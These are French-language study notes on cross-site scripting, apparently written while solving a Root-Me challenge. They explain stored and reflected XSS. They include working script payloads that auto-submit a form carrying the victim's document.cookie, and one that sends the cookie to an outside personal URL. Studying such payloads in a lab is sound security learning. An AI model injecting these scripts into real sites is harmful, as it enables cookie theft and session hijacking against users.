# Outil en ligne:
    - suppresion \n: https://www.textfixerfr.com/outils/outil-suppression-saut-de-ligne.php

# XSS : Injecter du code malveillant

## Attaques XSS stockées (XSS persistant):
    - Saisie de code possible
    - Non sécurisé
=> On cherche à faire executer du code au serveur ou aux utilisateurs.
=> on insere du code maniere à ce que les utilisateurs, au chargement de la page, envoie directement des données
(+> Completer et envoeyr un form par exemple)

Exemple de code: rootme-webClient-18

><form action="" method="POST" name="hehehe">
<input type="text" name="titre" value="autoenvoye">
<textarea name="message" rows="3" cols="50" value="j'envoie" id="hehetextarea"></textarea>
<input type="submit" value="send">
</form>

><script>
>document.getElementById("hehetextarea").value = document.cookie;
>hehehe.submit();
></script>

OU:
><script>
>document.getElementsByName("message")[0].value = document.cookie;
>document.getElementsByTagName("Form")[0].submit();
></script>

### Exemple d'envoie vers notre site pour récupérer les donnnées
><script>
>let url = "https://perso.isima.fr/~abzoghlami/secret_xss/xss_post.php?"+"titre=XSS-rootme-18" + "&" + "message=" + document.cookie;
>window.location.href = url;
></script>


## Attaques XSS reflétées (XSS non persistant):
    - Ici on cherche à pieger un utilisateur à l'aide d'un lien
    - Exploite un form de type GET par exemple de manière à faire executer une action à un utilisateur DEJA connecté